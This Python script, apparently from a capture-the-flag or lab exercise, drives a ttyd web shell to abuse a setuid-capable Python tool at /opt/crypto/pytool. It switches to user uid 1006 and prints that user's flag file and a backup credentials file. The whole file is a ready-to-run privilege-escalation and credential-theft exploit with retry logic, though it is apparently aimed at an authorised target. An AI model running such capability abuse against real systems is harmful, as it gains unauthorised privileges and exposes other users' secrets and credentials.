"""Final confirmation: become spookyboi (uid 1006) directly and read the flag.

This is also the in-scope path for "Dangerous Capability": the capability
tool -> setuid -> the flagged user.
"""
import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ttyd_client import Shell  # noqa: E402

LINES = [
    "import os, pwd",
    "os.setuid(1006)",                                    # spookyboi
    "import pwd; print('IAM', pwd.getpwuid(os.getuid()).pw_name, os.getuid())",
    "print('FLAGBYTES', repr(open('/home/spookyboi/flag.txt','rb').read()))",
    "print('FLAGTEXT', open('/home/spookyboi/flag.txt').read().strip())",
    "print('LEN', len(open('/home/spookyboi/flag.txt','rb').read()))",
    "print('BACKUP', open('/home/spookyboi/.backup/creds.bak').read())",
]


async def body(sh):
    await sh.read(2.5)
    await sh.send("/opt/crypto/pytool")
    await sh.read(3.5)
    for line in LINES:
        await sh.send(line)
        print(await sh.read(6.0))
    await sh.send("exit()")
    await sh.read(1.5)


async def amain():
    for attempt in range(6):
        try:
            async with Shell(cols=160, rows=60) as sh:
                await body(sh)
                return
        except Exception as e:
            print(f"[attempt {attempt + 1}] {type(e).__name__}: {e}", flush=True)
            await asyncio.sleep(5)
    print("[!] all attempts failed", flush=True)


asyncio.run(amain())
